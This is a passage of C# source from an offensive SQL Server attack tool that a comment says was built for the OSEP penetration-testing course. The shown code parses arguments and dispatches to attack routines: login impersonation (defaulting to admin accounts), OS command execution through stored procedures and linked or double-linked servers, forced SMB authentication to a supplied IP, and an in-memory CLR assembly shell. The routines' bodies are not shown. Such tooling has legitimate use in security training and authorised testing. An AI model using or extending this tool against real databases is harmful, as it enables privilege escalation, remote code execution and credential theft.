                        getSPN(arguments["getspn"].ToString());
                    }
                }

                if (!arguments.ContainsKey("server"))
                {
                    Environment.Exit(0);
                }
                
            }
            // if username or password is set but not both then the other one is required
            if (arguments.ContainsKey("username"))
            {
                req.Add("password", true);
            }
            if (arguments.ContainsKey("password"))
            {
                req.Add("username", true);
            }

            bool missing = false;
            foreach (var item in req)
            {
                if (!arguments.ContainsKey(item.Key))
                {
                    printBanner();
                    writeOutput("error", String.Format("\n\nMissing required argument {0}",item.Key));
                    missing = true;
                }
            }
            if (missing)
            {
                printhelp();
                Environment.Exit(1);
            }
            return arguments;
        }
        public void execArgs(SqlConnection conn, Dictionary<string, object> myargs)
        {
            bool impersonated = false;
            bool commandRan = false;
            bool queryRan = false;
            foreach (var item in myargs)
            {
                switch (item.Key.ToString())
                {
                    case "getlinked":
                        {
                           
                            // if param has not been given a value then it will be set to true
                            if (myargs["getlinked"].GetType() == typeof(bool))
                            {
                                getLinkedServers(conn);
                            }
                            else
                            {
                                // linked server has a value
                                getLinkedServers(conn, false, myargs["getlinked"].ToString());
                            }
                            break;
                        }

                    case "roles":
                        {
                           // get server roles
                            getServerRole(conn);
                            break;
                        }

                    case "impersonation":
                        {
                            // get impersonations
                            getImpersonation(conn);
                            break;
                        }

                    case "getusers":
                        {
                            // get users
                            getUsers(conn);
                            break;
                        }

                    case "impersonate":
                        {
                            // has impersonation already taken place
                            // if not continue
                            if (!impersonated)
                            {
                                // check if a user has been supplied in args
                               
                                    if (myargs["impersonate"].GetType() == typeof(bool))
                                    {
                                        impersonateMe(conn);
                                    }
                                    else
                                    {
                                        impersonateMe(conn, myargs["impersonate"].ToString());
                                    }

                                    if (myargs.ContainsKey("command"))
                                    {
                                        codeExec(conn, myargs["command"].ToString()); 
                                    }
   
                            }
                            
                            break;
                         }
                   
                    case "sp":
                        {
                            if (myargs.ContainsKey("impersonate"))
                            {
                              
                                // possible chance of running the impersonation function twice depending on the argument order
                                // impersonate argument has been passed on the cmd line,
                                // deal with the impersonation request first 
                                
                                if (myargs["impersonate"].GetType() == typeof(bool))
                                {
                                   
                                    impersonateMe(conn);
                                }
                                else
                                {
                                    impersonateMe(conn, myargs["impersonate"].ToString());
                                }
                                
                               impersonated = true;
                            }
                            if(myargs["sp"].GetType() == typeof(bool))
                            {
                                storedProcedureShell(conn);
                            }
                            else
                            {
                                storedProcedureShell(conn, myargs["sp"].ToString());
                            }
                           
                            break;
                        }
                    case "query":
                        {
                            //Console.WriteLine("QUERYRAN: {0}", queryRan);
                            if (!queryRan)
                            {
                                try
                                {
                                    if (myargs["query"].GetType() == typeof(bool))
                                    {
                                        execQuery(conn);
                                    }
                                    else
                                    {
                                        execQuery(conn, myargs["query"].ToString());
                                    }

                                }
                                catch (SqlException error)
                                {
                                    // impersonate has a value
                                    writeOutput("error", String.Format("SQL ERROR: {0}", error));
                                }
                            }

                            break;
                        }
                    case "smb":
                        {
                            try
                            {
                                if ((bool)myargs["smb"])
                                {
                                    writeOutput("error","SMB parameter requires an IP");
                                    Environment.Exit(1);
                                }
                            }
                            catch
                            {
                                //TODO regex for IP
                                connectSMB(conn, myargs["smb"].ToString());
                            }
                           
                            break;
                        }
                    case "linkserver":
                        {
                            // if query is in myargs then run query, 
                            // if command is in myargs then run a command
                            // if linklinkserver then run command on link link
                            if (myargs["linkserver"].GetType() == typeof(bool))
                            {
                                // need a value
                                writeOutput("error","Missing value for -linkserver");
                                printBanner();

                            }// make sure command hasn't been used for anything else
                            else if(myargs.ContainsKey("rpc"))
                            {
                                string[] servers = myargs["linkserver"].ToString().Split(',');
                                string linkserver = servers[0];
                                if (servers.Length > 1)
                                {
                                    string linklinkserver = servers[1];
                                    codeExec(conn,"", linkserver, linklinkserver, true);
                                }
                                else
                                {
                                    codeExec(conn, "", linkserver, null, true);
                                }
                               
                            }
                            else  if(myargs.ContainsKey("query") && !queryRan)
                            {
                                if (myargs["query"].GetType() == typeof(bool))
                                {
                                    linkedServerCmd(conn, myargs["linkserver"].ToString());
                                }
                                else
                                {
                                    linkedServerCmd(conn, myargs["linkserver"].ToString(), myargs["query"].ToString());
                                }
                                   
                                queryRan = true;
                            }
                            else if (myargs.ContainsKey("command") && !commandRan)
                            {
                                string[] servers = myargs["linkserver"].ToString().Split(',');
                                string linkserver = servers[0];
                                if (servers.Length > 1)
                                {
                                    string linklinkserver = servers[1];
                                    codeExec(conn, myargs["command"].ToString(), linkserver, linklinkserver);
                                }
                                else{
                                    codeExec(conn, myargs["command"].ToString(), linkserver);
                                }
                                
                                
                                commandRan = true;
                            }
                            else
                            {
                                // have a server value, use it
                                linkedServerCmd(conn, myargs["linkserver"].ToString());
                            }

                            break;
                        }
                    case "asm":
                        {
                            // need to have admin rights to be able to change some setting on the database
                            // check if impersonate flag has been added and use either sa or another known admin account
                            impersonateMe(conn);
                            bool sysadmin = getServerRole(conn);
                            if (myargs["asm"].GetType() == typeof(bool))
                            {
                                
                               
                                if (sysadmin)
                                {
                                    assemblyShellInMemory(conn);
                                }
                               // even if user isn't sysadmin and shell failed to run
                               // set the commandRan to true to prevent it trying to run xp cmdshell.
                                commandRan = true;
                            }
                            else
                            {
                                if (sysadmin)
                                {
                                    assemblyShellInMemory(conn, myargs["asm"].ToString());
                                }
                                else
                                {
                                    writeOutput("error","User does not  have sysadmin privileges");
                                }
                            }
                            
                            break;
                        }
                    case "clearasm":
                        {
                            if (myargs.ContainsKey("impersonate"))
                            {
                                clearAssembly(conn);
                            }
                            else
                            {
                                impersonateMe(conn);
                                clearAssembly(conn);
                            }
                           
                            break;
                        }
                    case "command":
                        {
                            if (!commandRan)
                            {
                                // run command on local server
                                codeExec(conn, myargs["command"].ToString());
                            }

                            break;
                        }
                }

            }
        }
        public static void Main(string[] args)
        {
            // created as part of osep course

            var p = new Program();
            p.printBanner();
            if (args.Length < 1)
            {
                p.printhelp();
                Environment.Exit(1);

            }
           
            var myargs = p.ArgumentParse(args);

            SqlConnection conn = null;

           if (myargs.ContainsKey("db"))
            {
                if (myargs.ContainsKey("username"))
                {
                    conn = p.databaseConnect(myargs["server"].ToString(), myargs["db"].ToString(), myargs["username"].ToString(), myargs["password"].ToString());
                }
                else
                {
                    conn = p.databaseConnect(myargs["server"].ToString(), myargs["db"].ToString());
                }
                
            }
            else
            {
                if (myargs.ContainsKey("username"))
                {
                    conn = p.databaseConnect(myargs["server"].ToString(),"master", myargs["username"].ToString(), myargs["password"].ToString());
                }
                else
                {
                    conn = p.databaseConnect(myargs["server"].ToString());
                }
               
            }
           
            // get current user
            p.getCurrentUser(conn);

            // run throught the params and execute the appropiate functions
            p.execArgs(conn, myargs);

            // close db
            p.closeDB(conn);
            Environment.Exit(0);
        }


} // end of class

} // end of namespace


